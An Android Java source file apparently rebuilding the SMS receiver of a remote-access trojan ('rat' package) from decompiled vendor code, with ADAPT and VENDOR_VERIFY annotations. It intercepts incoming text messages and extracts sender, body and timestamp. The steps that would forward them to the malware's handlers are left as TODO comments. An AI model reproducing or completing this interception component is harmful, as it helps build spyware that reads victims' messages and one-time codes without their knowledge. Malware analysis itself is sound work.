package com.vendor.rat.data.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * ADAPT: vendor com.guard.wallet.receiver.SmsReceiver
 * Receives SMS_RECEIVED and SMS_DELIVER broadcasts.
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";

    // ADAPT: vendor field f201a (Integer, init 0) — receiver alive flag
    public Integer receiverAlive = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] objArr;
        SmsMessage createFromPdu;
        try {
            this.receiverAlive = 1;
            String action = intent.getAction();
            if (!"android.provider.Telephony.SMS_RECEIVED".equals(action)
                    && !"android.provider.Telephony.SMS_DELIVER".equals(action)) {
                return;
            }
            Log.d(TAG, "开始接收短信.....");
            Bundle extras = intent.getExtras();
            String format = intent.getStringExtra("format");
            if (extras == null || extras.get("pdus") == null) {
                return;
            }
            objArr = (Object[]) extras.get("pdus");
            if (objArr == null || objArr.length <= 0) {
                return;
            }
            for (Object obj : objArr) {
                try {
                    byte[] bArr = (byte[]) obj;
                    if (bArr == null || bArr.length <= 0) {
                        continue;
                    }
                    createFromPdu = SmsMessage.createFromPdu(bArr, format);
                    if (createFromPdu == null) {
                        continue;
                    }
                    // ADAPT: vendor builds SmsMessageVO and sends via MessageRecordVO
                    // vendor: new SmsMessageVO(originAddr, displayAddr, body, format, timestamp, 1)
                    String originAddr = createFromPdu.getOriginatingAddress();
                    String displayAddr = createFromPdu.getDisplayOriginatingAddress();
                    String body = createFromPdu.getMessageBody();
                    String timestamp = String.valueOf(createFromPdu.getTimestampMillis());
                    Log.d(TAG, "SMS from: " + originAddr + ", body length: "
                            + (body != null ? body.length() : 0));
                    // TODO: VENDOR_VERIFY — vendor sends MessageRecordVO via MainApplication.getHandlerMsgAndTimer().b()
                    // TODO: VENDOR_VERIFY — vendor notifies SmsRecognizePlug listeners
                } catch (Exception e2) {
                    Log.e(TAG, "Error processing PDU", e2);
                }
            }
        } catch (Exception e3) {
            Log.e(TAG, "Error in onReceive", e3);
        }
    }
}